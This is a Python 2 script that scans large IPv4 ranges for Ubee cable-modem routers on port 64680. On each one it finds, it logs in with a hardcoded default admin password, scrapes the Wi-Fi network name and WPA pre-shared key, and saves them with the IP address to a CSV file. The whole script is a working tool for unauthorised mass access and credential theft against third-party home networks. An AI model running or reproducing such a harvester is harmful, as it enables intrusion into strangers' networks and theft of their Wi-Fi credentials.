# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import socket
count = 0
router = open('db1.csv','a+')
for i in range(185,255):
    i = i + 1
    #186.147.10.68
    for j in range(146,255):
        j = j + 1
        
        for p in range(9,255):
            p = p + 1
            
            for a in range(65,255):
                a = a + 1
            
                h =str(i)+'.'+str(j)+'.'+str(p)+'.'+str(a)
                #print 'Probando................'+h
                
                try:
                    #router.write(str(h)+'\n')
                    
                    r1 = requests.get('http://'+str(h)+':64680/wlanBasic.asp', timeout=0.3)
                    head = r1.headers
                    b = 'WWW-Authenticate' in head
                    #64680/wlanSecurity.asp
                    if b==True:
                        r = requests.get('http://'+h+':64680/wlanBasic.asp', timeout=0.3)
                        n = r.headers['WWW-Authenticate']=='Basic realm="Ubee"'
                        if n: ##Ubee
                            count = count + 1
                            r1 = requests.get('http://'+h+':64680/wlanBasic.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                            r2 = requests.get('http://'+h+':64680/wlanSecurity.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                            r3 = requests.get('http://'+h+':64680/CmInfo.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                            #http://181.50.5.185:64680/CmInfo.asp
                            parser1 = r1.content
                            parser2 = r2.content
                            parser3 = r1.content
                            Name = BeautifulSoup(parser1, "html.parser")
                            Pass = BeautifulSoup(parser2, "html.parser")
                            Mac = BeautifulSoup(parser3, "html.parser")
                            
                            for td in Name.find_all("input", {'name':'ServiceSetIdentifier'}):
                                for pss in Pass.find_all("input", {'name':"WpaPreSharedKey"}):
                                    print h + '.....' + 'Ubee' + '.....' + str(td["value"]) + '.....' + str(pss["value"])
                                    router.write(h +','+'Ubee'+','+str(td["value"])+','+str(pss["value"])+',\n')
                                    
                            for mac_ad in Mac.find("b").parent.find_all('tr'):##tr",{"valign":"top"},{"size":"2"}, text="MAC Address : "
                                print mac_ad
                                print 'imprime'
                            
                            
                            #for mac in Name.find("td",text="Wireless MAC Address:").parent.find_all('td'):
                                
                                
                               # print mac.text
                                
                except requests.exceptions.Timeout:
                    pass
                except KeyError:
                    pass
                except socket.timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
router.close()
print str(count)+" En total"
